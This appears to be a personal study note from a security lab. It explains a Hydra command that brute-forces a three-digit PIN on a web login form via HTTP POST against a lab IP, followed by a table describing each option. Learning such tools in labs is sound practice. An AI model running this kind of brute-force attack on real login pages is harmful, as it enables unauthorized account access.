Used to bruteforce password attacks. 
```sh
hydra -l '' -P 3digits.txt -f -v 10.10.73.59 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
```

|Option|Description|
|-|-|
|`-l NAME`|indicates the login name|
|`-P WORDLIST`|specifies the password file to use|
|`-f`|stops Hydra after finding a working password|
|`-v`|verbose|
|`http-post-form`|Specifies the HTTP method to use|
|`"/PAGE:PASS_VARIABLE_NAME=^PASS^:INVALID_TEXT"`|Has three parts separated by :, first the page where the HTTP is submitted, Where it will replace `^PASS^` with the values from the password list. Indicates that invalid passwords will lead to a page with that text|
|`-s PORT`|indicates the port number|

